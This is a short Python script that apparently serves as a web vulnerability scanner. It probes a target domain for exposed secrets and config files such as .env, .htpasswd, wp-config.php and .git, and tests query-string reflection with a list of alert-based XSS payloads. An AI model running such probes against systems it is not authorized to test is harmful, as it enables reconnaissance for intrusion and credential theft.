import requests
from colorama import Fore, Style

fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL

def check_file_uploads_and_xss(domain, cookies, headers):
    paths = [
        '/upload/', '/file-upload/', '/uploads/', '/admin/upload/', '/admin/file-upload/',
        '/.git/', '/.env', '/config.php', '/wp-config.php', '/app/etc/env.php', '/app/etc/config.php',
        '/.htaccess', '/.htpasswd', '/config/database.yml', '/config/secrets.yml', '/composer.json',
        '/composer.lock', '/package.json', '/package-lock.json', '/.babelrc', '/.gitignore', '/.gitattributes',
        '/.npmrc', '/.yarnrc', '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/.DS_Store',
        '/backups/', '/backup/', '/backups.zip', '/backup.zip', '/private/', '/temp/', '/tmp/', '/logs/'
    ]

    xss_payloads = [
        "<script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS');></iframe>"
    ]

    for path in paths:
        url = domain + path
        try:
            response = requests.get(url, headers=headers, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            if response.status_code == 200:
                print(f"{fg}[+] Sensitive file or directory found: {path}{fw}")
            else:
                print(f"{fy}[-] Path not found or not accessible: {path}{fw}")
        except requests.exceptions.RequestException as e:
            print(f"{fr}[-] Error checking path {path}: {e}{fw}")

    for payload in xss_payloads:
        try:
            response = requests.get(f"{domain}/?q={payload}", headers=headers, cookies=cookies, verify=False, timeout=10)
            if payload in response.text:
                print(f"{fg}[+] XSS vulnerability detected with payload: {payload}{fw}")
            else:
                print(f"{fy}[-] No XSS vulnerability detected with payload: {payload}{fw}")
        except requests.exceptions.RequestException as e:
            print(f"{fr}[-] Error checking XSS vulnerability with payload {payload}: {e}{fw}")